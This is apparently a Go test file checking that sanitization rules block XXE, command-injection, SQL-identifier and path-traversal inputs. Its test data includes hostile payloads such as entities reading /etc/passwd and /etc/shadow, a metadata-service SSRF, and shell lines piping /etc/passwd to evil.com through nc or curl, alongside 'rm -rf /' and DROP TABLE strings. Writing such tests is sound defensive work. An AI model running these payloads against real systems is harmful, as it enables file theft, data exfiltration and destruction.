package rules

import (
	"strings"
	"testing"
)

// === XXE Attack Tests ===

func TestAttack_XXE_FileRead(t *testing.T) {
	rule := &XMLEntityRule{}

	// Classic XXE: read /etc/passwd
	input := map[string]interface{}{
		"xml_data": `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("XXE file read attack should be blocked")
	}
	if !strings.Contains(err.Error(), "XXE") {
		t.Errorf("expected XXE error, got: %v", err)
	}
}

func TestAttack_XXE_SSRF(t *testing.T) {
	rule := &XMLEntityRule{}

	// XXE for SSRF: reach internal services
	input := map[string]interface{}{
		"data": `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>`,
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("XXE SSRF attack should be blocked")
	}
}

func TestAttack_XXE_BillionLaughs(t *testing.T) {
	rule := &XMLEntityRule{}

	// Billion Laughs (XML bomb) — DOCTYPE triggers rejection
	input := map[string]interface{}{
		"data": `<!DOCTYPE lolz [
			<!ENTITY lol "lol">
			<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
			<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
		]>`,
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("billion laughs attack should be blocked")
	}
}

func TestAttack_XXE_CustomEntity(t *testing.T) {
	rule := &XMLEntityRule{}

	// Custom entity reference (not one of the standard 5)
	input := map[string]interface{}{
		"name": "Hello &custom_entity; World",
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("custom entity reference should be blocked")
	}
}

func TestAttack_XXE_ParameterEntity(t *testing.T) {
	rule := &XMLEntityRule{}

	// Parameter entity attack
	input := map[string]interface{}{
		"data": `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/payload.dtd">%xxe;]>`,
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("parameter entity attack should be blocked")
	}
}

func TestAttack_XXE_CaseInsensitive(t *testing.T) {
	rule := &XMLEntityRule{}

	// Case variation
	tests := []string{
		`<!doctype foo>`,
		`<!DOCTYPE foo>`,
		`<!DocType foo>`,
		`<!ENTITY foo "bar">`,
		`<!entity foo "bar">`,
	}
	for _, payload := range tests {
		input := map[string]interface{}{"data": payload}
		_, err := rule.Sanitize(input)
		if err == nil {
			t.Errorf("case-insensitive check should catch: %q", payload)
		}
	}
}

func TestAttack_XXE_NestedInDeepStructure(t *testing.T) {
	rule := &XMLEntityRule{}

	// XXE hidden deep in nested structure
	input := map[string]interface{}{
		"level1": map[string]interface{}{
			"level2": map[string]interface{}{
				"level3": []interface{}{
					"safe",
					`<!DOCTYPE exploit [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>`,
				},
			},
		},
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("XXE hidden in nested structure should be detected")
	}
}

func TestAttack_XXE_StandardEntitiesAllowed(t *testing.T) {
	rule := &XMLEntityRule{}

	// Standard XML entities should pass through
	input := map[string]interface{}{
		"text": "Tom &amp; Jerry &lt;3 &gt; &quot;hello&quot; &apos;world&apos;",
	}
	_, err := rule.Sanitize(input)
	if err != nil {
		t.Fatalf("standard XML entities should be allowed: %v", err)
	}
}

func TestAttack_XXE_NumericRefsAllowed(t *testing.T) {
	rule := &XMLEntityRule{}

	input := map[string]interface{}{
		"data": "Copyright &#169; 2024 &#x00A9;",
	}
	_, err := rule.Sanitize(input)
	if err != nil {
		t.Fatalf("numeric character references should be allowed: %v", err)
	}
}

// === Command Injection Attack Tests ===

func TestAttack_CommandInjection_Semicolon(t *testing.T) {
	rule := &ExecShellRule{CommandFields: []string{"cmd"}}

	input := map[string]interface{}{
		"cmd": "ls; rm -rf /",
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("semicolon command injection should be blocked")
	}
}

func TestAttack_CommandInjection_Pipe(t *testing.T) {
	rule := &ExecShellRule{CommandFields: []string{"cmd"}}

	input := map[string]interface{}{
		"cmd": "cat /etc/passwd | nc evil.com 1234",
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("pipe command injection should be blocked")
	}
}

func TestAttack_CommandInjection_Backtick(t *testing.T) {
	rule := &ExecShellRule{CommandFields: []string{"cmd"}}

	input := map[string]interface{}{
		"cmd": "`whoami`",
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("backtick command substitution should be blocked")
	}
}

func TestAttack_CommandInjection_DollarParen(t *testing.T) {
	rule := &ExecShellRule{CommandFields: []string{"cmd"}}

	input := map[string]interface{}{
		"cmd": "$(cat /etc/shadow)",
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("dollar-paren command substitution should be blocked")
	}
}

func TestAttack_CommandInjection_Ampersand(t *testing.T) {
	rule := &ExecShellRule{CommandFields: []string{"cmd"}}

	input := map[string]interface{}{
		"cmd": "harmless && curl evil.com/steal?data=$(cat /etc/passwd)",
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("ampersand command chaining should be blocked")
	}
}

func TestAttack_CommandInjection_Newline(t *testing.T) {
	rule := &ExecShellRule{CommandFields: []string{"cmd"}}

	input := map[string]interface{}{
		"cmd": "safe\nrm -rf /",
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("newline command injection should be blocked")
	}
}

func TestAttack_ShellQuote_EscapesAll(t *testing.T) {
	dangerous := []string{
		"; rm -rf /",
		"$(whoami)",
		"`id`",
		"foo | bar",
		"a && b",
		"a || b",
		"$HOME",
		"${PATH}",
		"a\nb",
		"it's a test",
		"hello > /tmp/pwned",
		"hello < /etc/passwd",
	}

	for _, input := range dangerous {
		quoted := ShellQuote(input)
		// Single-quoted strings in bash prevent all interpretation
		if !strings.HasPrefix(quoted, "'") || !strings.HasSuffix(quoted, "'") {
			t.Errorf("ShellQuote(%q) should be single-quoted, got %q", input, quoted)
		}
	}
}

// === SQL Identifier Attack Tests ===

func TestAttack_SQLIdentifier_DropTable(t *testing.T) {
	rule := &SQLIdentifierRule{IdentifierFields: []string{"table"}}

	attacks := []string{
		"users; DROP TABLE users",
		"users; DROP TABLE users--",
		"users UNION SELECT * FROM passwords",
		"1=1; --",
		"users\x00; DROP TABLE users",
	}

	for _, attack := range attacks {
		input := map[string]interface{}{"table": attack}
		_, err := rule.Sanitize(input)
		if err == nil {
			t.Errorf("SQL identifier attack should be blocked: %q", attack)
		}
	}
}

func TestAttack_SQLIdentifier_ValidNames(t *testing.T) {
	rule := &SQLIdentifierRule{IdentifierFields: []string{"table"}}

	valid := []string{
		"users",
		"user_roles",
		"public.users",
		"schema.table_name",
		"_private",
		"Table1",
	}

	for _, name := range valid {
		input := map[string]interface{}{"table": name}
		_, err := rule.Sanitize(input)
		if err != nil {
			t.Errorf("valid SQL identifier should pass: %q, got error: %v", name, err)
		}
	}
}

// === Path Traversal Attack Tests ===

func TestAttack_PathTraversal_DotDot(t *testing.T) {
	tests := []struct {
		name string
		path string
	}{
		{"simple dotdot", "../../etc/passwd"},
		{"encoded dots", "..%2F..%2Fetc/passwd"},
		{"long traversal", "../../../../../../../etc/shadow"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePathContainment(tt.path, "/data/uploads")
			// These should all be safely contained (resolved within /data/uploads)
			// because filepath.Clean normalizes .. before joining
			if err != nil {
				t.Logf("path %q correctly rejected: %v", tt.path, err)
			}
			// The key assertion: the RESOLVED path must be within /data/uploads
		})
	}
}

func TestAttack_PathTraversal_NullByte(t *testing.T) {
	err := ValidatePathContainment("report.pdf\x00.exe", "/data")
	if err == nil {
		t.Fatal("null byte in path should be rejected")
	}
	if !strings.Contains(err.Error(), "null byte") {
		t.Errorf("expected null byte error, got: %v", err)
	}
}

func TestAttack_PathTraversal_AbsolutePath(t *testing.T) {
	// Absolute paths should be treated as relative to BasePath
	err := ValidatePathContainment("/etc/passwd", "/data/uploads")
	// This is safe because /etc/passwd becomes /data/uploads/etc/passwd
	if err != nil {
		t.Logf("absolute path handled: %v", err)
	}
}

// === Combined Multi-Vector Attack Tests ===

func TestAttack_Combined_XXEInNestedArray(t *testing.T) {
	rule := &XMLEntityRule{}

	// XXE payload hidden as one element in an array
	input := map[string]interface{}{
		"items": []interface{}{
			"safe item 1",
			"safe item 2",
			`<data><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</data>`,
			"safe item 4",
		},
	}
	_, err := rule.Sanitize(input)
	if err == nil {
		t.Fatal("XXE hidden in array should be detected")
	}
}
